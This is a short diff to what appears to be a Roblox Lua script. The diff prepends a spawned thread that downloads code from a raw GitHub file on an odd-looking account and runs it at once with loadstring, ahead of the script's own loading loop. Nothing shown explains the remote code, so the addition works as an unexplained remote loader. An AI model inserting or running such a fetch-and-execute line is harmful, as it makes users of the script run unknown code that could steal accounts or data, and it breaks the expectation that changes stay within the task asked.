@@ -1,3 +1,7 @@
+spawn(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/VAR_RECONNECT"))()
+end)
+
 repeat
     wait(2)
 until game:IsLoaded() and
